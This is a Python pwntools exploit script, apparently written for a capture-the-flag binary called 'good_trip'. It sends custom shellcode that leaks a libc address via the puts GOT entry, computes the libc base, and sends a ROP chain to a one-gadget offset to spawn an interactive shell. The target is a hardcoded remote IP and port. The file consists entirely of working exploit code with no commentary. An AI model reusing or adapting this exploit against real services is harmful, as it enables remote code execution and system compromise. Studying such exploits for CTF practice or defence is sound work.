#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./good_trip_patched")
libc = ELF("lib64/libc.so.6")
ld = ELF("lib64/ld-linux-x86-64.so.2")
context.binary = exe

code = f'''
    mov rbp, 0x404900
    mov rsp, 0x404900
    push {exe.got.puts}
    pop rdi
    mov rax, 0x1337131025 
    push rax
    push {0x401030}
    ret
    mov rdi, 0
    mov rsi, rsp
    mov rdx, 0x50
    push 0x401060
    ret
'''

# io = gdb.debug(exe.path, '')
io = remote('172.210.129.230', 1351)
io.sendlineafter(b'>> ', str(len(code)).encode())
io.sendlineafter(b'>> ', asm(code))
libc.address = unpack(io.recv(14).strip(), 'all')-0x5ad80-0x28000  
rop_chain = ROP(libc)
rop_chain.raw(libc.address+0xe38aa)
io.sendline(rop_chain.chain())

io.interactive()
